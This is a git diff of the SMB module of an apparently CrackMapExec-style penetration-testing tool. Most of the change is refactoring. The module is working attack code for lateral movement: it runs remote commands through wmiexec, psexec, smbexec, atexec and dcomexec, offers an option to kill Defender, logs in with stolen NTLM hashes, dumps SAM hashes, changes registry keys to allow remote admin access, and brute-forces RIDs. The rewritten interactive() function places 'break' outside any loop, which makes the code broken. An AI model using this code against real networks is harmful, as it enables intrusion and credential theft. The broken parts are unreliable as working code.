@@ -1,46 +1,51 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import socket
 import ntpath
+import socket
 import time
-from datetime import datetime
-from functools import wraps
-from traceback import format_exc
-from io import StringIO
 import pdb
 
-#Impacket
 import impacket
 
+from datetime import datetime
+from functools import wraps
+from io import StringIO
+from traceback import format_exc
+
 # Internals
-from cmx.connection import *
+import cmx
+
 from cmx import config as cfg
-from cmx.logger import CMXLogAdapter
-from cmx.servers.smb import CMXSMBServer
 
-from cmx.protocols.smb.MISC.smbspider import SMBSpider
-from cmx.protocols.smb.MISC.passpol import PassPolDump
-from cmx.protocols.smb.MISC.reg import RegHandler
-from cmx.protocols.smb.MISC.services import SVCCTL
+from cmx.connection import *
+
 from cmx.helpers.options import options
-
-
-from cmx.helpers.logger import write_log, highlight
+from cmx.helpers.logger import highlight, write_log
 from cmx.helpers.misc import *
 from cmx.helpers.wmirpc import RPCRequester
 
-from cmx.protocols.smb.EXECMETHODS.wmiexec import WMIEXEC as cmxWMIEXEC
-from cmx.protocols.smb.EXECMETHODS.atexec import TSCH_EXEC as cmxTSCH_EXEC
-from cmx.protocols.smb.EXECMETHODS.smbexec import SMBEXEC as cmxSMBEXEC
-from cmx.protocols.smb.EXECMETHODS.psexec import PSEXEC as cmxPSEXEC
-from cmx.protocols.smb.EXECMETHODS.dcomexec import DCOMEXEC as cmxDCOMEXEC
+from cmx.logger import CMXLogAdapter
 
-import cmx
+from cmx.protocols.smb.MISC.passpol import PassPolDump
+from cmx.protocols.smb.MISC.reg import RegHandler
+from cmx.protocols.smb.MISC.services import SVCCTL
+from cmx.protocols.smb.MISC.smbspider import SMBSpider
+
+from cmx.protocols.smb.EXECMETHODS.atexec import TSCH_EXEC as cmxTSCH_EXEC
+from cmx.protocols.smb.EXECMETHODS.dcomexec import DCOMEXEC as cmxDCOMEXEC
+from cmx.protocols.smb.EXECMETHODS.psexec import PSEXEC as cmxPSEXEC
+from cmx.protocols.smb.EXECMETHODS.smbexec import SMBEXEC as cmxSMBEXEC
+from cmx.protocols.smb.EXECMETHODS.wmiexec import WMIEXEC as cmxWMIEXEC
+
+from cmx.servers.smb import CMXSMBServer
+
+
+#################################################################################################
+#################################################################################################
 
 smb_share_name = gen_random_string(5).upper()
 smb_server = None
-
 
 def requires_smb_server(func):
     def _decorator(self, *args, **kwargs):
@@ -101,20 +106,16 @@ def requires_smb_server(func):
 
     return wraps(func)(_decorator)
 
-#################################################################################################
-#################################################################################################
-
 
 #################################################################################################
+#
+#   Init + protocol args
+#
 #################################################################################################
 
 
 class smb(connection):
-    """SMB connection class object.
-
-    Attributes:
-
-    """
+    """SMB connection class object."""
 
     def __init__(self, args, db, host):
         """Inits SMB class."""
@@ -140,6 +141,7 @@ class smb(connection):
 
     @staticmethod
     def proto_args(parser, std_parser, module_parser):
+        """SMB Protocol arguments."""
         smb_parser = parser.add_parser('smb', help="Attacks and enum over SMB", parents=[std_parser, module_parser])
         smb_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
         smb_parser.add_argument("-tgt", '--tgticket', metavar="TGT", dest='tgt', nargs='+', default=[], help='KerberosTGT')
@@ -150,16 +152,16 @@ class smb(connection):
 
         igroup = smb_parser.add_mutually_exclusive_group()
         igroup.add_argument("-i", '--interactive', action='store_true', help='Start an interactive command prompt')
-        
+
         dgroup = smb_parser.add_mutually_exclusive_group()
         dgroup.add_argument("-d", metavar="DOMAIN.DOMAIN", dest='domain', type=str, help="domain to authenticate to, MUST BE fully qualified. ie CONTOSO.LOCAL or CONTOSO.COM ")
         dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
-        
+
         smb_parser.add_argument("--port", type=int, choices={445, 139}, default=445, help="SMB port (default: 445)")
         smb_parser.add_argument("--share", metavar="SHARE", default="C$", help="specify a share (default: C$)")
         smb_parser.add_argument("--gen-relay-list", metavar='OUTPUT_FILE', help="outputs all hosts that don't require SMB signing to the specified file")
         smb_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
-        
+
         cgroup = smb_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
         cegroup = cgroup.add_mutually_exclusive_group()
         cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
@@ -224,21 +226,21 @@ class smb(connection):
         servicegroup = smb_parser.add_argument_group("Interact with Services")
         servicegroup.add_argument("-start-service", '--start-service', action='store_true', help='C')
         servicegroup.add_argument("-stop-service", '--stop-service', action='store_true', help='Che')
-        
 
         return parser
 
+
     def proto_logger(self):
-        """
-        Sets up logger.
+        """Set up logger.
+
         First thing called for a connection, inside proto_flow()
         """
         self.logger = CMXLogAdapter(extra={
-                                        'protocol': 'SMB',
-                                        'host': self.host,
-                                        'port': self.args.port,
-                                        'hostname': self.hostname
-                                        })
+                                    'protocol': 'SMB',
+                                    'host': self.host,
+                                    'port': self.args.port,
+                                    'hostname': self.hostname
+                                    })
         self.options.logger = self.logger
 
 
@@ -267,7 +269,8 @@ class smb(connection):
     @requires_admin
     @requires_smb_server
     def execute(self, payload=None, get_output=False, methods=None):
-        """Redirects execution to the specified method
+        """Execute a command using specified execution method. Defualt: wmiexec.
+
         Defaults to wmiexec
 
         Args:
@@ -277,7 +280,6 @@ class smb(connection):
         Returns:
 
         """
-
         if self.args.exec_method:
             method = self.args.exec_method
         else:
@@ -290,84 +292,89 @@ class smb(connection):
             get_output = True
 
         if self.args.kd:
-            killDefender = True 
+            killDefender = True
         else:
             killDefender = False
 
+        if hasattr(self, 'server'):
+            self.server.track_host(self.host)
+
+
+    # Start of execution method object builders
+
         if method == 'wmiexec':
             try:
-                exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender) # killDefender
+                exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender)
                 self.logger.announce('Executed command via wmiexec')
-                
             except:
-                logging.debug('Error executing command via wmiexec, traceback:')
+                self.logger.error('Failed to initiate wmiexec')
+                logging.debug('Error executing via wmiexec, traceback:')
                 logging.debug(format_exc())
-                
+                return
 
         elif method == 'dcomexec':
             try:
-                exec_method = DCOMEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
+                exec_method = cmxDCOMEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
                 self.logger.announce('Executed command via mmcexec')
-                
             except:
-                logging.debug('Error executing command via mmcexec, traceback:')
+                self.logger.error('Failed to initiate mmcexec')
+                logging.debug('Error executing via mmcexec, traceback:')
                 logging.debug(format_exc())
-                
+                return
 
         elif method == 'atexec':
             try:
-                exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
+                exec_method = cmxTSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
                 self.logger.announce('Executed command via atexec')
-                
             except:
-                logging.debug('Error executing command via atexec, traceback:')
+                self.logger.error('Failed to initiate atexec')
+                logging.debug('Error executing via atexec, traceback:')
                 logging.debug(format_exc())
-                
+                return
 
         elif method == 'smbexec':
             try:
-                exec_method = SMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.hash, self.args.share)
-                self.logger.announce('Executed command via smbexec')
-                
+                exec_method = cmxSMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.hash, self.args.share)
+                self.logger.announce('Executed via smbexec')
             except:
-                logging.debug('Error executing command via smbexec, traceback:')
+                self.logger.error('Failed to initiate smbexec')
+                logging.debug('Error executing via smbexec, traceback:')
                 logging.debug(format_exc())
-                return 'fail'
+                return
 
         elif method == 'psexec':
             try:
-                exec_method = PSEXEC(self.host, self.args.port, self.username, self.password, self.domain, self.hash) # aesKey, doKerberos=False, kdcHost, serviceName)
+                exec_method = cmxPSEXEC(self.host, self.args.port, self.username, self.password, self.domain, self.hash) # aesKey, doKerberos=False, kdcHost, serviceName)
                 self.logger.announce('Executed command via psexec')
-                
             except:
-                logging.debug('Error executing command via psexec, traceback:')
+                self.logger.error('Failed to initiate psexec')
+                logging.debug('Error executing via psexec, traceback:')
                 logging.debug(format_exc())
-                return 'fail'
+                return
+    # End execution method init
 
+        self.logger.debug('Executing {} via {}'.format(payload, method))
 
-        if hasattr(self, 'server'): self.server.track_host(self.host)
-
-
-        self.logger.debug('Executing {} via {}'.format(payload,method))
-
-
+        # Execute payload/command using execution object
         output = '{}'.format(exec_method.execute(payload, get_output).strip())
         self.logger.success('Execution Completed.')
-       
-        # Read output if a manual command was provided to run on the remote host 
+
+        # Read output if user command was provided
         if self.args.execute or self.args.ps_execute:
             self.logger.success('Results:')
 
             buf = StringIO(output).readlines()
             for line in buf:
-                self.logger.highlight('    '+line.strip())
+                self.logger.highlight('    ' + line.strip())
 
         return output
 
 
     @requires_admin
     def ps_execute(self, payload=None, get_output=False, methods=None, force_ps32=False, dont_obfs=False):
-        """Execute a powershell command
+        """Execute a powershell payload.
+
+        Payload can be a file or command
 
         Args:
 
@@ -381,7 +388,7 @@ class smb(connection):
         if not payload and self.args.ps_execute:
             payload = self.args.ps_execute
 
-        if not self.args.no_output: 
+        if not self.args.no_output:
             get_output = True
 
         return self.execute(create_ps_command(payload, force_ps32=force_ps32, dont_obfs=False, server_os=self.server_os), get_output, methods)
@@ -390,72 +397,89 @@ class smb(connection):
     @requires_admin
     @requires_smb_server
     def interactive(self, payload=None, get_output=False, methods=None):
+        """Start an interactive shell."""
         self.logger.announce("Bout to get shellular")
 
         if self.args.exec_method:
-            methods = [self.args.exec_method]
+            method = self.args.exec_method
+        else:
+            method = 'wmiexec' # 'dcomexec', 'atexec', 'smbexec', 'psexec'
 
-        if not methods:
-            methods = ['wmiexec', 'dcomexec', 'atexec', 'smbexec', 'psexec']
+        if not payload:
+            payload = self.args.execute
 
-        for method in methods:
-            if method == 'wmiexec':
-                try:
-                    exec_method = WMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share)
-                    logging.debug('Interactive shell using wmiexec')
-                    break
-                except:
-                    logging.debug('Error launching shell via wmiexec, traceback:')
-                    logging.debug(format_exc())
-                    continue
+        if not self.args.no_output:
+            get_output = True
 
-            elif method == 'dcomexec':
-                try:
-                    exec_method = DCOMEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
-                    logging.debug('Interactive shell using mmcexec')
-                    break
-                except:
-                    logging.debug('Error launching shell via mmcexec, traceback:')
-                    logging.debug(format_exc())
-                    continue
+        if self.args.kd:
+            killDefender = True
+        else:
+            killDefender = False
 
-            elif method == 'atexec':
-                try:
-                    exec_method = TSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
-                    logging.debug('Interactive shell using atexec')
-                    break
-                except:
-                    logging.debug('Error launching shell via atexec, traceback:')
-                    logging.debug(format_exc())
-                    continue
+        if hasattr(self, 'server'):
+            self.server.track_host(self.host)
 
-            elif method == 'smbexec':
-                try:
-                    exec_method = SMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.hash, self.args.share)
-                    logging.debug('Interactive shell using smbexec')
-                    break
-                except:
-                    logging.debug('Error launching shell via smbexec, traceback:')
-                    logging.debug(format_exc())
-                    return 'fail'
-                    
-            elif method == 'psexec':
-                try:
-                    exec_method = PSEXEC(self.host, self.args.port, self.username, self.password, self.domain, self.hash) # aesKey, doKerberos=False, kdcHost, serviceName)
-                    self.logger.announce('Interactive shell using psexec')
-                    break
-                except:
-                    logging.debug('Error executing command via psexec, traceback:')
-                    logging.debug(format_exc())
-                    return 'fail'
+    # Start of execution method object builders
+
+        if method == 'wmiexec':
+            try:
+                exec_method = cmxWMIEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash, self.args.share, killDefender)
+                logging.debug('Interactive shell using wmiexec')
+                break
+            except:
+                self.logger.error('Failed to initiate wmiexec')
+                logging.debug('Error launching shell via wmiexec, traceback:')
+                logging.debug(format_exc())
+                break
+
+        elif method == 'dcomexec':
+            try:
+                exec_method = cmxDCOMEXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.conn, self.hash)
+                logging.debug('Interactive shell using mmcexec')
+                break
+            except:
+                self.logger.error('Failed to initiate mmcexec')
+                logging.debug('Error launching shell via mmcexec, traceback:')
+                logging.debug(format_exc())
+                break
+
+        elif method == 'atexec':
+            try:
+                exec_method = cmxTSCH_EXEC(self.host, self.smb_share_name, self.username, self.password, self.domain, self.hash) #self.args.share)
+                logging.debug('Interactive shell using atexec')
+                break
+            except:
+                self.logger.error('Failed to initiate atexec')
+                logging.debug('Error launching shell via atexec, traceback:')
+                logging.debug(format_exc())
+                break
+
+        elif method == 'smbexec':
+            try:
+                exec_method = cmxSMBEXEC(self.host, self.smb_share_name, self.args.port, self.username, self.password, self.domain, self.hash, self.args.share)
+                logging.debug('Interactive shell using smbexec')
+                break
+            except:
+                self.logger.error('Failed to initiate smbexec')
+                logging.debug('Error launching shell via smbexec, traceback:')
+                logging.debug(format_exc())
+                break
+
+        elif method == 'psexec':
+            try:
+                exec_method = cmxPSEXEC(self.host, self.args.port, self.username, self.password, self.domain, self.hash) # aesKey, doKerberos=False, kdcHost, serviceName)
+                self.logger.announce('Interactive shell using psexec')
+                break
+            except:
+                self.logger.error('Failed to initiate psexec')
+                logging.debug('Error executing command via psexec, traceback:')
+                logging.debug(format_exc())
+                break
 
         try:
             exec_method.run(self.host, self.host)
         except Exception as e:
             logging.debug('b {}'.format(str(e)))
-        
-
-##########################
 
 
 ###############################################################################
@@ -481,11 +505,8 @@ class smb(connection):
 #
 ###############################################################################
 
-
     def create_smbv1_conn(self):
-        """
-        Setup connection using smbv1
-        """
+        """Setup connection using smbv1."""
         try:
             logging.debug('Attempting SMBv1 connection to {}'.format(self.host))
             self.conn = impacket.smbconnection.SMBConnection(self.host, self.host, None, self.args.port, preferredDialect=impacket.smb.SMB_DIALECT)
@@ -503,10 +524,9 @@ class smb(connection):
         logging.debug('Connected using SMBv1 to: {}'.format(self.host))
         return True
 
-
     def create_smbv3_conn(self):
-        """
-        Setup connection using smbv3
+        """Setup connection using smbv3.
+
         Used for both SMBv2 and SMBv3
         """
         try:
@@ -525,7 +545,6 @@ class smb(connection):
         logging.debug('Connected using SMBv3 to: {}'.format(self.host))
         return True
 
-
     def create_conn_obj(self):
         if self.create_smbv1_conn():
             return True
@@ -538,13 +557,13 @@ class smb(connection):
 
 ###############################################################################
 
-        #       #######  #####  ### #     # 
-        #       #     # #     #  #  ##    # 
-        #       #     # #        #  # #   # 
-        #       #     # #  ####  #  #  #  # 
-        #       #     # #     #  #  #   # # 
-        #       #     # #     #  #  #    ## 
-        ####### #######  #####  ### #     # 
+        #       #######  #####  ### #     #
+        #       #     # #     #  #  ##    #
+        #       #     # #        #  # #   #
+        #       #     # #  ####  #  #  #  #
+        #       #     # #     #  #  #   # #
+        #       #     # #     #  #  #    ##
+        ####### #######  #####  ### #     #
 
 ###############################################################################
 ###############################################################################
@@ -554,16 +573,16 @@ class smb(connection):
 #   plaintext_login
 #   hash_login
 #
-###############################################################################                        
+###############################################################################
 
 
     def plaintext_login(self, domain, username, password):
-        """
+        """Login using user+password.
 
         Args:
-            
+
         Raises:
-            
+
         Returns:
 
         """
@@ -580,9 +599,9 @@ class smb(connection):
                 self.db.add_admin_user('plaintext', domain, username, password, self.host)
 
             out = '{}\\{}:{} {}'.format(domain,
-                                         username,
-                                         password,
-                                         highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))
+                                        username,
+                                        password,
+                                        highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))
 
             self.logger.success(out)
             if not self.args.continue_on_success:
@@ -590,10 +609,10 @@ class smb(connection):
         except SessionError as e:
             error, desc = e.getErrorString()
             self.logger.error('{}\\{}:{} {} {}'.format(domain,
-                                                        username,
-                                                        password,
-                                                        error,
-                                                        '({})'.format(desc) if self.args.verbose else ''))
+                                                       username,
+                                                       password,
+                                                       error,
+                                                       '({})'.format(desc) if self.args.verbose else ''))
 
             if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)
 
@@ -601,19 +620,19 @@ class smb(connection):
 
 
     def hash_login(self, domain, username, ntlm_hash):
-        """
-        
+        """Login using user + Hash.
+
         Args:
-            
+
         Raises:
-            
+
         Returns:
 
         """
         lmhash = ''
         nthash = ''
 
-        #This checks to see if we didn't provide the LM Hash
+        #Checks to see if we didn't provide the LM Hash
         if ntlm_hash.find(':') != -1:
             lmhash, nthash = ntlm_hash.split(':')
         else:
@@ -623,8 +642,10 @@ class smb(connection):
             self.conn.login(username, '', domain, lmhash, nthash)
 
             self.hash = ntlm_hash
-            if lmhash: self.lmhash = lmhash
-            if nthash: self.nthash = nthash
+            if lmhash:
+                self.lmhash = lmhash
+            if nthash:
+                self.nthash = nthash
 
             self.username = username
             self.domain = domain
@@ -635,9 +656,9 @@ class smb(connection):
                 self.db.add_admin_user('hash', domain, username, ntlm_hash, self.host)
 
             out = '{}\\{} {} {}'.format(domain,
-                                         username,
-                                         ntlm_hash,
-                                         highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))
+                                        username,
+                                        ntlm_hash,
+                                        highlight('({})'.format(cfg.pwn3d_label) if self.admin_privs else ''))
 
             self.logger.success(out)
             if not self.args.continue_on_success:
@@ -645,12 +666,13 @@ class smb(connection):
         except SessionError as e:
             error, desc = e.getErrorString()
             self.logger.error('{}\\{} {} {} {}'.format(domain,
-                                                        username,
-                                                        ntlm_hash,
-                                                        error,
-                                                        '({})'.format(desc) if self.args.verbose else ''))
+                                                       username,
+                                                       ntlm_hash,
+                                                       error,
+                                                       '({})'.format(desc) if self.args.verbose else ''))
 
-            if error == 'STATUS_LOGON_FAILURE': self.inc_failed_login(username)
+            if error == 'STATUS_LOGON_FAILURE':
+                self.inc_failed_login(username)
 
             return False
 
@@ -672,7 +694,7 @@ class smb(connection):
 
         :return: None, raises a Session Error if error.
         """
-        import os
+
         from impacket.krb5.ccache import CCache
         from impacket.krb5.kerberosv5 import KerberosError
         from impacket.krb5 import constants
@@ -735,43 +757,43 @@ class smb(connection):
 #   Registry functions
 #
 # This section:
-#   uac
+#   fix_uac
 #   uac_status
-#   
+#
 #
 ###############################################################################
 
     @requires_admin
     def fix_uac(self):
-        """
-        Adds the keys LocalAccountTokenFilterPolicy and EnableLUA 
+        r"""Make reg modifications for remote UAC.
+
+        Adds the keys LocalAccountTokenFilterPolicy and EnableLUA
         to HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System
 
         Set values to 1
         """
-        
-        #self.logger.announce('')
         dcip = self.dc_ip
+        # self.logger.announce('')
 
         class Ops:
             def __init__(self):
                 self.action = 'ENABLEUAC'
                 self.aesKey = None
                 self.k = False
-                self.dc_ip = dcip 
-                self.hashes = None 
+                self.dc_ip = dcip
+                self.hashes = None
                 self.port = 445
 
         options = Ops()
 
         try:
-            regHandler = RegHandler(self.username, self.password, self.domain, self.logger, options)
-            regHandler.run(self.host, self.host)
+            reghandler = RegHandler(self.username, self.password, self.domain, self.logger, options)
+            reghandler.run(self.host, self.host)
 
         except Exception as e:
             self.logger.error('Error creating/running regHandler connection: {}'.format(e))
-            return 
-        
+            return
+
         #try:
         #    restart_uac()
         #except Exception as e:
@@ -783,11 +805,10 @@ class smb(connection):
 
     @requires_admin
     def uac_status(self):
-        """
-        Checks the status of Remote UAC (EnableLUA + LocalAccountTokenFilterPolicy)
+        """Check the status of Remote UAC.
 
+        (EnableLUA + LocalAccountTokenFilterPolicy)
         """
-
         dcip = self.dc_ip
 
         class Ops:
@@ -802,8 +823,8 @@ class smb(connection):
         options = Ops()
 
         try:
-            regHandler = RegHandler(self.username, self.password, self.domain, self.logger, options)
-            regHandler.run(self.host, self.host)
+            reghandler = RegHandler(self.username, self.password, self.domain, self.logger, options)
+            reghandler.run(self.host, self.host)
 
         except Exception as e:
             self.logger.error('Error creating/running regHandler connection: {}'.format(e))
@@ -834,7 +855,7 @@ class smb(connection):
 ###############################################################################
 
     def stop_service(self):
-        """Restarts server service
+        """Restarts server service.
 
         Args:
 
@@ -843,9 +864,8 @@ class smb(connection):
         Returns:
 
         """
-        
-        #self.logger.announce('')
         dcip = self.dc_ip
+        #self.logger.announce('')
 
         class Ops:
             def __init__(self, action='LIST'):
@@ -926,14 +946,13 @@ class smb(connection):
 # This section:
 #   wmi
 #   dualhome
-#   
+#
 #
 ###############################################################################
 
-
     @requires_admin
     def wmi(self, wmi_query=None, namespace=None):
-        """Execute via WMI
+        """Execute WMI query.
 
         Args:
 
@@ -964,8 +983,8 @@ class smb(connection):
                 wmi_results = query.Next(0xffffffff, 1)[0]
                 record = wmi_results.getProperties()
                 records.append(record)
-                for k,v in record.items():
-                    self.logger.highlight('{} => {}'.format(k,v['value']))
+                for k, v in record.items():
+                    self.logger.highlight('{} => {}'.format(k, v['value']))
                 self.logger.highlight('')
             except Exception as e:
                 if str(e).find('S_FALSE') < 0:
@@ -1002,10 +1021,7 @@ class smb(connection):
         try:
             rpc = RPCRequester(self.host, self.domain, self.username, self.password, self.lmhash, self.nthash)
             rpc._create_wmi_connection(namespace=namespace)
-
-
             query = rpc._wmi_connection.ExecQuery(getCons, lFlags=impacket.dcerpc.v5.dcom.wmi.WBEM_FLAG_FORWARD_ONLY)
-
         except Exception as e:
             self.logger.error('Error creating WMI connection: {}'.format(e))
             return records
@@ -1016,8 +1032,8 @@ class smb(connection):
                 wmi_results = query.Next(0xffffffff, 1)[0]
                 record = wmi_results.getProperties()
                 records.append(record)
-                
-                for k,v in record.items():
+
+                for k, v in record.items():
                     returnedIndex.append(v['value'])
 
             except Exception as e:
@@ -1025,12 +1041,12 @@ class smb(connection):
                     raise e
                 else:
                     break
-        
+
         try:
             for index in returnedIndex:
                 queryStr = 'select DNSDomainSuffixSearchOrder, IPAddress from win32_networkadapterconfiguration where index = {}'.format(index) 
                 results.append(rpc._wmi_connection.ExecQuery(queryStr, lFlags=impacket.dcerpc.v5.dcom.wmi.WBEM_FLAG_FORWARD_ONLY))
-            
+
         except Exception as e:
             self.logger.error('Error creating WMI connection: {}'.format(e))
             return records
@@ -1042,9 +1058,9 @@ class smb(connection):
                     wmi_results = result.Next(0xffffffff, 1)[0]
                     record2 = wmi_results.getProperties()
                     records2.append(record2)
-                    
-                    for k,v in record2.items():
-                        self.logger.highlight('{} => {}'.format(k,v['value']))
+
+                    for k, v in record2.items():
+                        self.logger.highlight('{} => {}'.format(k, v['value']))
                     self.logger.highlight('')
 
                 except Exception as e:
@@ -1060,13 +1076,13 @@ class smb(connection):
 
 ###############################################################################
 
-#     # #######  #####  #######       ####### #     # #     # #     # 
-#     # #     # #     #    #          #       ##    # #     # ##   ## 
-#     # #     # #          #          #       # #   # #     # # # # # 
-####### #     #  #####     #    ##### #####   #  #  # #     # #  #  # 
-#     # #     #       #    #          #       #   # # #     # #     # 
-#     # #     # #     #    #          #       #    ## #     # #     # 
-#     # #######  #####     #          ####### #     #  #####  #     # 
+#     # #######  #####  #######       ####### #     # #     # #     #
+#     # #     # #     #    #          #       ##    # #     # ##   ##
+#     # #     # #          #          #       # #   # #     # # # # #
+####### #     #  #####     #    ##### #####   #  #  # #     # #  #  #
+#     # #     #       #    #          #       #   # # #     # #     #
+#     # #     # #     #    #          #       #    ## #     # #     #
+#     # #######  #####     #          ####### #     #  #####  #     #
 
 ###############################################################################
 ###############################################################################
@@ -1084,16 +1100,10 @@ class smb(connection):
 #
 ####################################################################################
 
-
     def enum_host_info(self):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Fingerprint host via smb connection.
 
+        Grabs info prior to unauthenticated
         """
         self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
 
@@ -1112,7 +1122,7 @@ class smb(connection):
         self.os_arch    = self.get_os_arch()                    # 64
         self.domain_dns = self.conn.getServerDNSDomainName()    # ocean.depth
 
-        self.logger.hostname = self.hostname   
+        self.logger.hostname = self.hostname
         dialect = self.conn.getDialect()
 
         #print (self.conn.getServerDomain())            # OCEAN
@@ -1172,18 +1182,13 @@ class smb(connection):
 
 
     def disks(self):
-        """Enumerate disks
+        """Enumerate disks.
 
         *** This does require local admin i think. Made to return nothing if not admin.
 
-            
-        Raises:
-            
-        Returns:
-
         """
-        #self.logger.info('Attempting to enum disks...')
         try:
+            #self.logger.info('Attempting to enum disks...')
             rpctransport = impacket.dcerpc.v5.transport.SMBTransport(self.host, 445, r'\srvsvc', smb_connection=self.conn)
             dce = rpctransport.get_dce_rpc()
             dce.connect()
@@ -1216,27 +1221,19 @@ class smb(connection):
             dce.disconnect()
             return
 
-        #self.logger.info('Finished disk enum')            
+        #self.logger.info('Finished disk enum')
         dce.disconnect()
         return
 
+
     def sessions(self):
-        """Enumerate sessions
-        
+        """Enumerate sessions.
+
+        Identifes sessions and their originating host.
         Using impackets hNetrSessionEnum from https://github.com/SecureAuthCorp/impacket/blob/ec9d119d102251d13e2f9b4ff25966220f4005e9/impacket/dcerpc/v5/srvs.py
-
-        *** This was supposed to grab a list of all computers, then do session enum - or thats what it sounds like in impackets version
-        Actually, looks at the target and identifes sessions and their originating host.
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
-
         """
-        #self.logger.announce('Starting Session Enum')
         try:
+            #self.logger.announce('Starting Session Enum')
             rpctransport = impacket.dcerpc.v5.transport.SMBTransport(self.host, 445, r'\srvsvc', smb_connection=self.conn)
             dce = rpctransport.get_dce_rpc()
             dce.connect()
@@ -1274,20 +1271,12 @@ class smb(connection):
 
 
     def loggedon(self):
-        """
-        
+        """Enumerate Loggedon users.
+
         I think it requires localadmin, but handles if it doesnt work.
-        Args:
-            
-        Raises:
-            
-        Returns:
-
         """
-
-        loggedon = []
-        #self.logger.announce('Checking for logged on users')
         try:
+            #self.logger.announce('Checking for logged on users')
             rpctransport = impacket.dcerpc.v5.transport.SMBTransport(self.host, 445, r'\wkssvc', smb_connection=self.conn)
             dce = rpctransport.get_dce_rpc()
             dce.connect()
@@ -1327,20 +1316,12 @@ class smb(connection):
 
 
     def local_users(self):
-        """
-        To enumerate local users
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Enumerate local users.
 
+        Need to figure out if needs localadmin or its a waste of effort
         """
-        users = []
-        #self.logger.announce('Checking Local Users')
-
         try:
+            #self.logger.announce('Checking Local Users')
             rpctransport = impacket.dcerpc.v5.transport.SMBTransport(self.host, 445, r'\samr', username=self.username, password=self.password, smb_connection=self.conn)
             dce = rpctransport.get_dce_rpc()
             dce.connect()
@@ -1351,16 +1332,16 @@ class smb(connection):
 
                 try:
                     logging.debug('Connect w/ hSamrConnect...')
-                    resp = impacket.dcerpc.v5.samr.hSamrConnect(dce)  
+                    resp = impacket.dcerpc.v5.samr.hSamrConnect(dce)
 
-                    logging.debug('Dump of hSamrConnect response:') 
+                    logging.debug('Dump of hSamrConnect response:')
                     if self.debug:
                         resp.dump()
-                    
+
                     self.logger.debug('Looking up host name')
-                    serverHandle = resp['ServerHandle'] 
+                    serverHandle = resp['ServerHandle']
                     resp2 = impacket.dcerpc.v5.samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
-                    logging.debug('Dump of hSamrEnumerateDomainsInSamServer response:') 
+                    logging.debug('Dump of hSamrEnumerateDomainsInSamServer response:')
                     if self.debug:
                         resp2.dump()
 
@@ -1368,11 +1349,11 @@ class smb(connection):
                     logging.debug('Looking up localusers on: '+ domains[0]['Name'])
                     resp = impacket.dcerpc.v5.samr.hSamrLookupDomainInSamServer(dce, serverHandle, domains[0]['Name'])
 
-                    logging.debug('Dump of hSamrLookupDomainInSamServer response:' )
+                    logging.debug('Dump of hSamrLookupDomainInSamServer response:')
                     if self.debug:
                         resp.dump()
 
-                    resp = impacket.dcerpc.v5.samr.hSamrOpenDomain(dce, serverHandle = serverHandle, domainId = resp['DomainId'])
+                    resp = impacket.dcerpc.v5.samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=resp['DomainId'])
 
                     logging.debug('Dump of hSamrOpenDomain response:')
                     if self.debug:
@@ -1433,23 +1414,15 @@ class smb(connection):
         #self.logger.announce('Finished Checking Local Users')
         dce.disconnect()
         return
-        
+
 
     def local_groups(self):
-        """
-        To enumerate local groups 
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
+        """Enumerate local groups.
 
+        Need to figure out if needs localadmin or its a waste of effort
         """
-        groups = []
-        #self.logger.announce('Checking Local Groups')
-
         try:
+            #self.logger.announce('Checking Local Groups')
             rpctransport = impacket.dcerpc.v5.transport.SMBTransport(self.host, 445, r'\samr', username=self.username, password=self.password, smb_connection=self.conn)
             dce = rpctransport.get_dce_rpc()
             dce.connect()
@@ -1525,7 +1498,7 @@ class smb(connection):
                                 m = impacket.dcerpc.v5.samr.hSamrOpenUser(dce, domainHandle, impacket.dcerpc.v5.samr.MAXIMUM_ALLOWED, member)
                                 guser = impacket.dcerpc.v5.samr.hSamrQueryInformationUser2(dce, m['UserHandle'], impacket.dcerpc.v5.samr.USER_INFORMATION_CLASS.UserAllInformation)
                                 self.logger.highlight('{}\\{:<30}  '.format(tmpdomain, guser['Buffer']['All']['UserName']))
-                                
+
                                 logging.debug('Dump of hSamrQueryInformationUser2 response:')
                                 if self.debug:
                                     guser.dump()
@@ -1554,18 +1527,9 @@ class smb(connection):
 
 
     def rid_brute(self, maxRid=None):
-        """
-        
-        Args:
-            
-        Raises:
-            
-        Returns:
-
-        """
-
+        """Brute force RIDs."""
